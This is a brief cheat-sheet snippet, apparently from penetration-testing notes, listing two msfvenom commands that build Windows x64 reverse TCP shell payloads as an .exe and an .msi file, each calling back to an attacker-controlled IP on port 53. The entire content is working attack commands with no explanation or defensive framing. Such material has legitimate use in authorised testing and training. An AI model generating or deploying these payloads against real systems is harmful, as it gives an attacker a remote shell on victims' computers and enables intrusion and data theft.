#MSFVENOM PAYLOADS (WINDOWS)
        msfvenom -p windows/x64/shell_reverse_tcp LHOST=[attacker ip] LPORT=53 -f exe -o reverse.exe
        msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi
